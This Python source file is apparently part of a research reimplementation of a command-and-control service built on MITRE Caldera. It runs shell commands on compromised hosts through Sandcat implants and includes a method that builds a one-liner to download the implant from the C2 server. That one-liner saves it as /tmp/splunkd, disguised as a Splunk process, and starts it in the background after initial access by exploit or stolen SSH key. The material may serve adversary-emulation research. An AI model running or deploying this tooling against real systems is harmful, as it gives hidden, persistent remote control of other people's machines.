"""
Command & Control service backed by MITRE Caldera -- the paper's C&C server service.

Once a Sandcat implant is deployed on a host (out-of-band: via the Struts exploit
or a stolen SSH key) and beaconing back to Caldera, this service lets the rest of
Incalmo drive it through Caldera's REST API:

  - list_agents()            : which hosts have a live implant
  - agent_paw(group)         : look up an agent's id (paw) by group label
  - execute_command(paw, cmd): run a shell command on that host and get stdout back
                               -- WITHOUT re-exploiting (exploit once, then C&C)

How execute_command works (Caldera has no one-call "exec"):
  create a running ad-hoc operation (empty adversary, so nothing auto-runs)
  -> POST a "manual command" potential-link to the target agent
  -> the agent runs it on its next beacon
  -> GET the link result (base64 of {"stdout","stderr","exit_code"}) and decode.
"""

import base64
import json
import os
import time
import urllib.error
import urllib.request
import uuid


class CncService:
    def __init__(self, base_url: str = "http://localhost:8888", api_token: str = None):
        self.base = base_url.rstrip("/") + "/api/v2"
        # Caldera prints the red API token in its startup logs; pass it here or
        # via the CALDERA_API_KEY env var. It changes when the container is recreated.
        self.token = api_token or os.environ.get("CALDERA_API_KEY")
        if not self.token:
            raise ValueError("Caldera API token required (api_token=... or CALDERA_API_KEY env)")
        self._op_id = None

    # ---------- low-level REST helper ----------
    def _api(self, method: str, path: str, body=None):
        data = json.dumps(body).encode() if body is not None else None
        req = urllib.request.Request(
            self.base + path, data=data, method=method,
            headers={"KEY": self.token, "Content-Type": "application/json"},
        )
        with urllib.request.urlopen(req) as r:
            txt = r.read().decode()
            return json.loads(txt) if txt else None

    # ---------- public API ----------
    def list_agents(self) -> list:
        return [
            {"paw": a["paw"], "host": a["host"],
             "group": a["group"], "platform": a["platform"]}
            for a in self._api("GET", "/agents")
        ]

    def agent_paw(self, group: str):
        for a in self._api("GET", "/agents"):
            if a["group"] == group:
                return a["paw"]
        return None

    def execute_command(self, paw: str, command: str, timeout: int = 300) -> str:
        op_id = self._ensure_operation()
        link = self._api("POST", f"/operations/{op_id}/potential-links", {
            "paw": paw,
            "executor": {"platform": "linux", "name": "sh", "command": command},
            "ability": {"ability_id": str(uuid.uuid4()), "tactic": "execution",
                        "technique_id": "T0000", "technique_name": "manual",
                        "name": "manual", "description": "manual command"},
        })
        link_id = link["id"]

        waited = 0
        while waited < timeout:
            time.sleep(3)
            waited += 3
            res = self._api("GET", f"/operations/{op_id}/links/{link_id}/result")
            if res and res.get("result"):
                decoded = json.loads(base64.b64decode(res["result"]).decode())
                return decoded.get("stdout", "").strip()
        raise TimeoutError(f"command timed out after {timeout}s: {command}")

    # ---------- installing a new implant ----------
    def agent_deploy_command(self, group: str,
                             server_url: str = "http://host.docker.internal:8888") -> str:
        """
        Bash command that downloads the (arm64) Sandcat implant and runs it in the
        background, beaconing to Caldera under `group`. Run this ON the target host
        via the initial-access channel (WebShell / SshRunner). `server_url` must be
        reachable FROM the target container (host.docker.internal on Docker Desktop).
        No ';' / no double-quotes so it survives passing through msfconsole + ssh.
        """
        return (
            f"server={server_url} "
            "&& curl -s -X POST -H 'file:sandcat.go' -H 'platform:linux' $server/file/download > /tmp/splunkd "
            "&& chmod +x /tmp/splunkd "
            f"&& ( nohup /tmp/splunkd -server $server -group {group} >/tmp/sandcat.log 2>&1 </dev/null & ) "
            "&& echo LAUNCHED"
        )

    def wait_for_agent(self, group: str, timeout: int = 90) -> str:
        """Poll until an implant in `group` has beaconed in; return its paw."""
        waited = 0
        while waited < timeout:
            paw = self.agent_paw(group)
            if paw:
                return paw
            time.sleep(3)
            waited += 3
        raise TimeoutError(f"no agent in group '{group}' after {timeout}s")

    # ---------- bootstrap: resolve ids + one reusable ad-hoc operation ----------
    def _ensure_operation(self) -> str:
        if self._op_id:
            return self._op_id
        planner_id = self._find("/planners", "name", "atomic", "id")
        source_id = self._find("/sources", "name", "basic", "id")
        adversary_id = self._empty_adversary()
        op = self._api("POST", "/operations", {
            "name": "incalmo-cnc",
            "adversary": {"adversary_id": adversary_id},
            "planner": {"id": planner_id},
            "source": {"id": source_id},
            "state": "running", "autonomous": 1, "auto_close": False,
        })
        self._op_id = op["id"]
        return self._op_id

    def _find(self, path: str, key: str, value: str, ret: str) -> str:
        for item in self._api("GET", path):
            if item.get(key) == value:
                return item[ret]
        raise RuntimeError(f"no item in {path} with {key}={value}")

    def _empty_adversary(self) -> str:
        # Reuse our empty adversary if present, else create one (nothing auto-runs).
        for a in self._api("GET", "/adversaries"):
            if a["name"] == "incalmo-adhoc-empty":
                return a["adversary_id"]
        a = self._api("POST", "/adversaries", {
            "name": "incalmo-adhoc-empty",
            "description": "empty adversary for manual C&C commands",
            "atomic_ordering": [],
        })
        return a["adversary_id"]
